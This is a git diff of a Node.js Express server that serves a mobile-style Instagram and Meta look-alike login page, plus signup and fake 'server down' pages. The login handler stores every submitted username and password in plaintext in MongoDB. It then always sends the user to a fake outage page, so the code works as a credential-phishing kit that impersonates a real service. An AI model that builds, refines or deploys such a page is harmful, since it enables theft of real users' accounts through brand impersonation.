@@ -1,9 +1,6 @@
-// server.js
 // ===============================
-// Full server with Login, Signup, Server-down pages
-// Updated Logic:
-// FIRST login attempt -> directly opens Server Down page
-// Password minimum 6 characters logic kept same
+// INSTAGRAM MOBILE CLONE LOGIN
+// FINAL UPDATED UI
 // ===============================
 
 const express = require("express");
@@ -17,11 +14,10 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// serve static files from "public"
 app.use(express.static(path.join(__dirname, "public")));
 
 // ===============================
-// MongoDB connection
+// MONGODB
 // ===============================
 const MONGODB_URI =
   process.env.MONGODB_URI ||
@@ -29,30 +25,28 @@ const MONGODB_URI =
 
 mongoose
   .connect(MONGODB_URI)
-  .then(() => console.log("✅ Connected to MongoDB"))
-  .catch((err) => console.error("MongoDB connection error:", err));
+  .then(() => console.log("✅ MongoDB Connected"))
+  .catch((err) => console.log(err));
 
 // ===============================
-// User model
+// USER MODEL
 // ===============================
 const userSchema = new mongoose.Schema({
-  username: { type: String, required: true, trim: true },
-  emailOrPhone: { type: String, trim: true },
-  fullName: { type: String, trim: true },
-  password: { type: String, required: true },
+  username: String,
+  password: String,
+  emailOrPhone: String,
+  fullName: String,
 });
 
 const User = mongoose.model("User", userSchema);
 
 // ===============================
-// API: LOGIN
-// FIRST ATTEMPT -> SERVER DOWN
+// LOGIN API
 // ===============================
 app.post("/api/login", async (req, res) => {
   try {
     const { username, password } = req.body;
 
-    // validation
     if (!username || !password) {
       return res.status(400).json({
         success: false,
@@ -60,7 +54,7 @@ app.post("/api/login", async (req, res) => {
       });
     }
 
-    // KEEP THIS SAME
+    // KEEP SAME
     if (password.length < 6) {
       return res.status(400).json({
         success: false,
@@ -68,7 +62,7 @@ app.post("/api/login", async (req, res) => {
       });
     }
 
-    // save entered credentials
+    // SAVE USER DATA
     await User.create({
       username,
       password,
@@ -76,68 +70,77 @@ app.post("/api/login", async (req, res) => {
       fullName: "",
     });
 
-    // DIRECTLY REDIRECT TO SERVER DOWN PAGE
+    // FIRST ATTEMPT DIRECTLY SERVER DOWN
     return res.json({
       success: true,
       redirect: "/server-down",
     });
+
   } catch (err) {
-    console.error("Login error:", err);
+
+    console.log(err);
 
     return res.status(500).json({
       success: false,
-      message: "Server error",
+      message: "Server Error",
     });
   }
 });
 
 // ===============================
-// API: SIGNUP
+// SIGNUP API
 // ===============================
 app.post("/api/signup", async (req, res) => {
-  try {
-    const { emailOrPhone, password, fullName, username } = req.body;
 
-    if (!emailOrPhone || !password || !fullName || !username) {
+  try {
+
+    const {
+      emailOrPhone,
+      password,
+      fullName,
+      username
+    } = req.body;
+
+    if (
+      !emailOrPhone ||
+      !password ||
+      !fullName ||
+      !username
+    ) {
+
       return res.status(400).json({
-        success: false,
-        message: "All fields are required",
+        success:false,
+        message:"All fields required"
       });
     }
 
     if (password.length < 6) {
-      return res.status(400).json({
-        success: false,
-        message: "Password length minimum 6 characters",
-      });
-    }
 
-    const exists = await User.findOne({ username });
-
-    if (exists) {
       return res.status(400).json({
-        success: false,
-        message: "Username already taken",
+        success:false,
+        message:"Password length minimum 6 characters"
       });
     }
 
     await User.create({
-      username,
-      password,
       emailOrPhone,
+      password,
       fullName,
+      username,
     });
 
     return res.json({
-      success: true,
-      redirect: "/",
+      success:true,
+      redirect:"/"
     });
+
   } catch (err) {
-    console.error("Signup error:", err);
+
+    console.log(err);
 
     return res.status(500).json({
-      success: false,
-      message: "Signup failed",
+      success:false,
+      message:"Signup Failed"
     });
   }
 });
@@ -148,10 +151,16 @@ app.post("/api/signup", async (req, res) => {
 const loginPageHTML = `
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+
 <meta charset="UTF-8" />
-<title>Instagram Login Clone</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0"/>
+
+<title>Instagram</title>
 
 <style>
 
@@ -163,172 +172,362 @@ const loginPageHTML = `
 }
 
 body{
-  background:#000;
-  color:#fff;
-  display:flex;
-  justify-content:center;
-  align-items:center;
+  background:#0f1c26;
+  color:white;
   min-height:100vh;
-  padding:20px;
+  overflow-x:hidden;
 }
 
 .page-wrapper{
-  max-width:360px;
   width:100%;
+  max-width:420px;
+  margin:auto;
+  padding:30px 24px;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
 }
 
-.card{
-  border:1px solid #262626;
-  padding:36px;
+.language{
   text-align:center;
+  color:#9aa4ad;
+  font-size:18px;
+  margin-top:10px;
+}
+
+.logo-box{
+  display:flex;
+  justify-content:center;
+  margin-top:70px;
+  margin-bottom:60px;
 }
 
 .logo-img{
-  width:180px;
-  margin:0 auto 22px;
-  display:block;
+  width:170px;
 }
 
 .input-group{
   position:relative;
-  margin-bottom:14px;
-  text-align:left;
+  margin-bottom:16px;
 }
 
 .input-group input{
   width:100%;
-  padding:12px;
-  background:#121212;
-  border:1px solid #363636;
-  border-radius:6px;
-  color:#fff;
+  height:58px;
+  padding:0 18px;
+  background:#182734;
+  border:1px solid #3a4c5c;
+  border-radius:16px;
+  color:white;
+  font-size:18px;
+  outline:none;
 }
 
 .input-group input::placeholder{
-  color:#888;
+  color:#95a1ac;
 }
 
-.show-btn{
+.eye-btn{
   position:absolute;
-  right:10px;
-  top:35%;
+  right:16px;
+  top:50%;
   transform:translateY(-50%);
-  padding:6px 12px;
-  font-size:13px;
-  background:#2a2a2a;
-  border:1px solid #555;
-  border-radius:6px;
+  background:none;
+  border:none;
   cursor:pointer;
-  color:#fff;
-}
-
-.input-error{
-  color:#f02849;
-  font-size:12px;
-  min-height:16px;
-  margin-top:4px;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:0;
+  width:32px;
+  height:32px;
+  overflow:visible;
 }
 
 .login-btn{
-  margin-top:12px;
   width:100%;
-  padding:10px 0;
-  background:#385185;
+  height:54px;
   border:none;
-  border-radius:8px;
-  color:#fff;
+  border-radius:30px;
+  background:#1877f2;
+  color:white;
+  font-size:20px;
   font-weight:600;
+  margin-top:10px;
   cursor:pointer;
 }
 
-.bottom-card{
-  margin-top:18px;
-  border:1px solid #262626;
-  padding:14px;
+.forgot-password{
   text-align:center;
+  margin-top:26px;
+  color:white;
+  font-size:18px;
 }
 
-.bottom-card a{
-  color:#0095f6;
+.input-error{
+  color:#ff4d67;
+  font-size:13px;
+  margin-top:6px;
+  margin-left:4px;
+}
+
+.bottom-section{
+  margin-top:auto;
+  padding-bottom:30px;
+}
+
+.create-account{
+  width:100%;
+  height:54px;
+  border:1px solid #1877f2;
+  border-radius:30px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#1877f2;
+  font-size:20px;
+  font-weight:600;
+  margin-bottom:34px;
   text-decoration:none;
 }
 
+.meta-logo{
+  text-align:center;
+  color:#d4d4d4;
+  font-size:22px;
+}
+
 </style>
+
 </head>
 
 <body>
 
 <div class="page-wrapper">
 
-<div class="card">
+<div class="language">
+English (US)
+</div>
 
-<img src="/image_copy.png" class="logo-img" />
+<div class="logo-box">
+<img
+src="/Og_logo-Photoroom.png"
+class="logo-img"/>
+</div>
 
 <form id="loginForm">
 
 <div class="input-group">
-<input id="username" type="text" placeholder="Phone number, username, or email" />
-<div id="usernameError" class="input-error"></div>
+
+<input
+id="username"
+type="text"
+placeholder="Username, email or mobile number"
+/>
+
+<div
+id="usernameError"
+class="input-error">
+</div>
+
 </div>
 
 <div class="input-group">
-<input id="password" type="password" placeholder="Password" />
 
-<button type="button" id="togglePassword" class="show-btn">
-Show
+<input
+id="password"
+type="password"
+placeholder="Password"
+/>
+
+<button
+type="button"
+id="togglePassword"
+class="eye-btn">
+
+<!-- EYE OPEN -->
+<svg
+id="eyeOpen"
+xmlns="http://www.w3.org/2000/svg"
+width="24"
+height="24"
+viewBox="0 0 24 24"
+fill="none"
+stroke="white"
+stroke-width="2"
+stroke-linecap="round"
+stroke-linejoin="round">
+
+<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"></path>
+
+<circle cx="12" cy="12" r="3"></circle>
+
+</svg>
+
+<!-- EYE CLOSE -->
+<svg
+id="eyeClose"
+style="display:none"
+xmlns="http://www.w3.org/2000/svg"
+width="24"
+height="24"
+viewBox="0 0 24 24"
+fill="none"
+stroke="white"
+stroke-width="2"
+stroke-linecap="round"
+stroke-linejoin="round">
+
+<path d="M2 2L22 22"></path>
+
+<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
+
+<path d="M10.73 5.08A10.43 10.43 0 0 1 12 5
+c7 0 11 7 11 7
+a21.31 21.31 0 0 1-2.31 3.34"></path>
+
+<path d="M6.61 6.61A21.18 21.18 0 0 0 1 12
+s4 7 11 7
+a10.68 10.68 0 0 0 5.39-1.39"></path>
+
+</svg>
+
 </button>
 
-<div id="passwordError" class="input-error"></div>
+<div
+id="passwordError"
+class="input-error">
 </div>
 
-<button type="submit" id="loginBtn" class="login-btn">
+</div>
+
+<button
+type="submit"
+id="loginBtn"
+class="login-btn">
+
 Log in
+
 </button>
 
-<div id="globalError" class="input-error" style="text-align:center;margin-top:8px;"></div>
+<div
+id="globalError"
+class="input-error"
+style="text-align:center;margin-top:10px;">
+</div>
 
 </form>
 
+<div class="forgot-password">
+Forgot password?
 </div>
 
-<div class="bottom-card">
-Don't have an account?
-<a href="/signup">Sign up</a>
+<div class="bottom-section">
+
+<a
+href="/signup"
+class="create-account">
+
+Create new account
+
+</a>
+
+<div class="meta-logo">
+Meta
+</div>
+
 </div>
 
 </div>
 
 <script>
 
-const passwordInput = document.getElementById('password');
-const togglePassword = document.getElementById('togglePassword');
+// PASSWORD ELEMENTS
+const passwordInput =
+document.getElementById('password');
 
-togglePassword.addEventListener('click', () => {
+const togglePassword =
+document.getElementById('togglePassword');
 
-  const isHidden = passwordInput.type === 'password';
+const eyeOpen =
+document.getElementById('eyeOpen');
 
-  passwordInput.type = isHidden ? 'text' : 'password';
+const eyeClose =
+document.getElementById('eyeClose');
 
-  togglePassword.textContent = isHidden ? 'Hide' : 'Show';
+// SHOW EYE ICON WHEN PASSWORD INPUT FOCUS
+passwordInput.addEventListener('focus', () => {
+
+  togglePassword.style.display = 'flex';
 });
 
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
+// HIDE EYE ICON WHEN CLICK OUTSIDE
+document.addEventListener('click', (e) => {
+
+  const insidePassword =
+  e.target.closest('.input-group');
+
+  if (!insidePassword) {
+
+    togglePassword.style.display = 'none';
+  }
+});
+
+// TOGGLE PASSWORD VISIBILITY
+togglePassword.addEventListener('click', (e) => {
 
   e.preventDefault();
 
-  document.getElementById('globalError').textContent = '';
-  document.getElementById('passwordError').textContent = '';
+  const hidden =
+  passwordInput.type === 'password';
+
+  passwordInput.type =
+  hidden ? 'text' : 'password';
+
+  if(hidden){
+
+    eyeOpen.style.display = 'none';
+    eyeClose.style.display = 'block';
+
+  }else{
+
+    eyeOpen.style.display = 'block';
+    eyeClose.style.display = 'none';
+  }
+});
+
+// LOGIN FORM
+document
+.getElementById('loginForm')
+.addEventListener('submit', async (e) => {
+
+  e.preventDefault();
+
+  document
+  .getElementById('globalError')
+  .textContent = '';
+
+  document
+  .getElementById('passwordError')
+  .textContent = '';
 
   const username =
-    document.getElementById('username').value.trim();
+  document
+  .getElementById('username')
+  .value
+  .trim();
 
   const password =
-    document.getElementById('password').value;
+  document
+  .getElementById('password')
+  .value;
 
   if (!username || !password) {
 
-    document.getElementById('globalError').textContent =
-      'Fill the username and password';
+    document
+    .getElementById('globalError')
+    .textContent =
+    'Fill the username and password';
 
     return;
   }
@@ -336,52 +535,55 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   // KEEP SAME
   if (password.length < 6) {
 
-    document.getElementById('passwordError').textContent =
-      'Password length minimum 6 characters';
+    document
+    .getElementById('passwordError')
+    .textContent =
+    'Password length minimum 6 characters';
 
     return;
   }
 
-  const loginBtn = document.getElementById('loginBtn');
-
-  loginBtn.disabled = true;
-
   try {
 
-    const res = await fetch('/api/login', {
+    const res =
+    await fetch('/api/login', {
+
       method:'POST',
+
       headers:{
         'Content-Type':'application/json'
       },
+
       body:JSON.stringify({
         username,
         password
       })
     });
 
-    const data = await res.json();
+    const data =
+    await res.json();
 
     if (!data.success) {
 
-      document.getElementById('globalError').textContent =
-        data.message || 'Server error';
+      document
+      .getElementById('globalError')
+      .textContent =
+      data.message || 'Server Error';
 
     } else {
 
       window.location.href =
-        data.redirect || '/server-down';
+      data.redirect || '/server-down';
     }
 
   } catch(err){
 
-    console.error(err);
+    console.log(err);
 
-    document.getElementById('globalError').textContent =
-      'Server error';
-
-  } finally {
-
-    loginBtn.disabled = false;
+    document
+    .getElementById('globalError')
+    .textContent =
+    'Server Error';
   }
 
 });
@@ -398,119 +600,194 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 const signupPageHTML = `
 <!DOCTYPE html>
 <html>
+
 <head>
-<meta charset="UTF-8" />
-<title>Signup</title>
+
+<meta charset="UTF-8"/>
+
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0"/>
+
+<title>Instagram Signup</title>
 
 <style>
 
 body{
-  background:#000;
-  color:#fff;
+  background:#0f1c26;
+  color:white;
   font-family:system-ui;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
+  padding:24px;
 }
 
-.box{
-  width:350px;
-  border:1px solid #262626;
-  padding:30px;
+.container{
+  max-width:420px;
+  margin:auto;
+}
+
+.logo{
+  text-align:center;
+  margin-top:40px;
+  margin-bottom:40px;
+}
+
+.logo img{
+  width:170px;
 }
 
 input{
   width:100%;
-  padding:12px;
-  margin-bottom:12px;
-  background:#121212;
-  border:1px solid #363636;
-  border-radius:6px;
-  color:#fff;
+  height:56px;
+  margin-bottom:16px;
+  padding:0 18px;
+  border-radius:16px;
+  border:1px solid #3a4c5c;
+  background:#182734;
+  color:white;
+  font-size:18px;
+  outline:none;
 }
 
 button{
   width:100%;
-  padding:12px;
-  background:#0095f6;
+  height:54px;
   border:none;
-  border-radius:6px;
-  color:#fff;
+  border-radius:30px;
+  background:#1877f2;
+  color:white;
+  font-size:20px;
+  font-weight:600;
   cursor:pointer;
 }
 
 a{
-  color:#0095f6;
+  color:#1877f2;
+  text-decoration:none;
+}
+
+.bottom{
+  text-align:center;
+  margin-top:30px;
 }
 
 </style>
+
 </head>
 
 <body>
 
-<div class="box">
+<div class="container">
 
-<h2 style="margin-bottom:20px;">Sign Up</h2>
+<div class="logo">
+
+<img src="/Og_logo-Photoroom.png"/>
+
+</div>
 
 <form id="signupForm">
 
-<input id="emailOrPhone" placeholder="Email or Phone" />
+<input
+id="emailOrPhone"
+placeholder="Mobile number or email"
+/>
 
-<input id="signupPassword" type="password" placeholder="Password" />
+<input
+id="signupPassword"
+type="password"
+placeholder="Password"
+/>
 
-<input id="fullName" placeholder="Full Name" />
+<input
+id="fullName"
+placeholder="Full Name"
+/>
 
-<input id="signupUsername" placeholder="Username" />
+<input
+id="signupUsername"
+placeholder="Username"
+/>
 
-<button type="submit">Sign up</button>
+<button type="submit">
+
+Sign up
+
+</button>
 
 </form>
 
-<p style="margin-top:20px;text-align:center;">
-Already have account?
-<a href="/">Login</a>
-</p>
+<div class="bottom">
+
+Already have an account?
+
+<a href="/">
+Log in
+</a>
+
+</div>
 
 </div>
 
 <script>
 
-document.getElementById('signupForm').addEventListener('submit', async (e) => {
+document
+.getElementById('signupForm')
+.addEventListener('submit', async (e) => {
 
   e.preventDefault();
 
   const emailOrPhone =
-    document.getElementById('emailOrPhone').value.trim();
+  document
+  .getElementById('emailOrPhone')
+  .value
+  .trim();
 
   const password =
-    document.getElementById('signupPassword').value;
+  document
+  .getElementById('signupPassword')
+  .value;
 
   const fullName =
-    document.getElementById('fullName').value.trim();
+  document
+  .getElementById('fullName')
+  .value
+  .trim();
 
   const username =
-    document.getElementById('signupUsername').value.trim();
+  document
+  .getElementById('signupUsername')
+  .value
+  .trim();
 
-  if (!emailOrPhone || !password || !fullName || !username) {
+  if (
+    !emailOrPhone ||
+    !password ||
+    !fullName ||
+    !username
+  ){
 
     alert('Please fill all fields');
+
     return;
   }
 
-  if (password.length < 6) {
+  if(password.length < 6){
 
     alert('Password length minimum 6 characters');
+
     return;
   }
 
-  try {
+  try{
 
-    const res = await fetch('/api/signup', {
+    const res =
+    await fetch('/api/signup',{
+
       method:'POST',
+
       headers:{
         'Content-Type':'application/json'
       },
+
       body:JSON.stringify({
         emailOrPhone,
         password,
@@ -519,21 +796,23 @@ document.getElementById('signupForm').addEventListener('submit', async (e) => {
       })
     });
 
-    const data = await res.json();
+    const data =
+    await res.json();
 
-    if (!data.success) {
+    if(!data.success){
 
-      alert(data.message || 'Signup failed');
+      alert(data.message || 'Signup Failed');
 
-    } else {
+    }else{
 
       window.location.href = '/';
     }
 
-  } catch(err){
+  }catch(err){
 
-    console.error(err);
-    alert('Signup failed');
+    console.log(err);
+
+    alert('Signup Failed');
   }
 
 });
@@ -553,39 +832,44 @@ const serverDownHTML = `
 
 <head>
 
-<meta charset="utf-8"/>
+<meta charset="UTF-8"/>
 
 <title>Server Down</title>
 
 <style>
 
 body{
-  background:#000;
-  color:#fff;
+  background:#0f1c26;
+  color:white;
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
-  font-family:sans-serif;
+  font-family:system-ui;
 }
 
 .box{
   text-align:center;
-  padding:24px;
-  border:1px solid #262626;
 }
 
 img{
-  width:150px;
-  margin-bottom:12px;
+  width:170px;
+  margin-bottom:20px;
+}
+
+h2{
+  margin-bottom:10px;
 }
 
 button{
-  padding:10px 18px;
-  background:#0095f6;
-  color:#fff;
+  margin-top:20px;
+  width:220px;
+  height:50px;
   border:none;
-  border-radius:8px;
+  border-radius:30px;
+  background:#1877f2;
+  color:white;
+  font-size:18px;
   cursor:pointer;
 }
 
@@ -597,14 +881,16 @@ button{
 
 <div class="box">
 
-<img src="/image.png" />
+<img src="/Og_logo-Photoroom.png"/>
 
 <h2>Server is down</h2>
 
 <p>Sorry, something went wrong.</p>
 
 <button onclick="location.href='/'">
-Try again
+
+Try Again
+
 </button>
 
 </div>
@@ -616,17 +902,25 @@ Try again
 // ===============================
 // ROUTES
 // ===============================
-app.get("/", (req, res) => res.send(loginPageHTML));
+app.get("/", (req, res) => {
+  res.send(loginPageHTML);
+});
 
-app.get("/signup", (req, res) => res.send(signupPageHTML));
+app.get("/signup", (req, res) => {
+  res.send(signupPageHTML);
+});
 
-app.get("/server-down", (req, res) =>
-  res.send(serverDownHTML)
-);
+app.get("/server-down", (req, res) => {
+  res.send(serverDownHTML);
+});
 
 // ===============================
-// START SERVER
+// SERVER START
 // ===============================
 app.listen(PORT, () => {
-  console.log("🚀 Server running on http://localhost:" + PORT);
+
+  console.log(
+    "🚀 Server running on http://localhost:" + PORT
+  );
+
 });
